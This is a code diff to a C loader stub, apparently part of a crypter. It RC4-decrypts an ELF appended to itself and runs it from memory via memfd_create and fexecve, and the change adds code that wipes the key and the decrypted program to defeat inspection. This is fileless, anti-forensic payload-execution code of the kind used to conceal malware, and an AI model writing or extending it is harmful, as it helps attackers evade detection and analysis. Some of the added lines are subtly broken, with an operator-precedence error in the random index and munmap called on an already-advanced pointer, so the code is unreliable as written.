@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <time.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/syscall.h>
@@ -17,13 +18,19 @@ static inline int memfd_create(const char *name, unsigned int flags) {
  *           for this program to mask its intentions a little bit.
  */
 int main(int argc, char *argv[], char *envp[]) {
+  int             i;
   int             fd;
   int             in;
   size_t          offset;
   size_t          filesize;
   unsigned char   *key;
   void            *program;
+  char            characters[] = \
+    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 
+
+  /* Seed RNG */
+  srand(time(NULL));
 
   /* Calculate size of the stub + encrypted ELF */
   filesize = get_file_size(argv[0]);
@@ -53,6 +60,10 @@ int main(int argc, char *argv[], char *envp[]) {
   if (rc4(program, filesize - offset, key) == 1)
     return EXIT_FAILURE;
 
+  /* Overwrite key with random shit to hide its true contents. */
+  for(; *key; key++)
+    *key = characters[rand() % sizeof(characters) - 1];
+
   /* Some operating systems may not supply this function. This has only
    * been tested on modern Linux distributions (as of 2018). Alternatively,
    * you can modify this to utilize a temporary file or shm_open(). We use the
@@ -62,12 +73,18 @@ int main(int argc, char *argv[], char *envp[]) {
   if (fd == -1)
     return EXIT_FAILURE;
 
+  /* Write decrypted program data to memory file descriptor */
   if (write(fd, program, filesize - offset) != filesize - offset)
     return EXIT_FAILURE;
 
-  /* Attempt to execute decrypted ELF which is stored in memory. */
-  close(in);
+  /* Overwrite decrypted program with randomness before unmapping it.*/
+  for(i = 0; i < filesize - offset; i++, program++)
+    *((char *)program) = rand() % 0xff;
+
   munmap(program, filesize);
+  close(in);
+
+  /* Attempt to execute decrypted ELF which is stored in memory fd. */
   fexecve(fd, argv, envp);
   close(fd);
 
